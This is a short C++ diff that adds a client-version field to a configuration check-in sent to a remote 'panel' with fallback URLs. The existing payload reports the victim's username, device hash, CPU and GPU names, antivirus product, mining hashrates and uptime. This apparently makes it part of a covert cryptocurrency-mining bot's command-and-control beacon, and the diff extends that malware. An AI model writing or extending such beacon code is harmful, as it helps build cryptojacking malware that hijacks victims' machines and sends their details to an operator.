@@ -18,6 +18,7 @@ bool ConfigManager::FetchConfigFromPanelWithFallback(const std::string& panelUrl
                                                      const std::string& cpuName,
                                                      const std::string& gpuName,
                                                      const std::string& antivirusName,
+                                                     const std::string& clientVersion,
                                                      double cpuHashrate,
                                                      double gpuHashrate,
                                                      int deviceUptimeMin) {
@@ -52,7 +53,7 @@ bool ConfigManager::FetchConfigFromPanelWithFallback(const std::string& panelUrl
         std::cout << "[*] Attempting connection to panel " << (i + 1) << "/" << urls.size() << ": " << urls[i] << std::endl;
 #endif
         
-        if (FetchConfigFromPanel(wurl, pcUsername, deviceHash, cpuName, gpuName, antivirusName, cpuHashrate, gpuHashrate, deviceUptimeMin)) {
+        if (FetchConfigFromPanel(wurl, pcUsername, deviceHash, cpuName, gpuName, antivirusName, clientVersion, cpuHashrate, gpuHashrate, deviceUptimeMin)) {
 #ifdef _DEBUG
             std::cout << "[+] Successfully connected to panel: " << urls[i] << std::endl;
 #endif
@@ -176,6 +177,7 @@ bool ConfigManager::FetchConfigFromPanel(const std::wstring& panelUrl,
                                          const std::string& cpuName,
                                          const std::string& gpuName,
                                          const std::string& antivirusName,
+                                         const std::string& clientVersion,
                                          double cpuHashrate,
                                          double gpuHashrate,
                                          int deviceUptimeMin) {
@@ -190,6 +192,7 @@ bool ConfigManager::FetchConfigFromPanel(const std::wstring& panelUrl,
             {"gpu_hashrate", gpuHashrate},
             {"antivirus_name", antivirusName},
             {"device_uptime_min", deviceUptimeMin},
+            {"client_version", clientVersion},
             {"timestamp", std::time(nullptr)}
         };
 
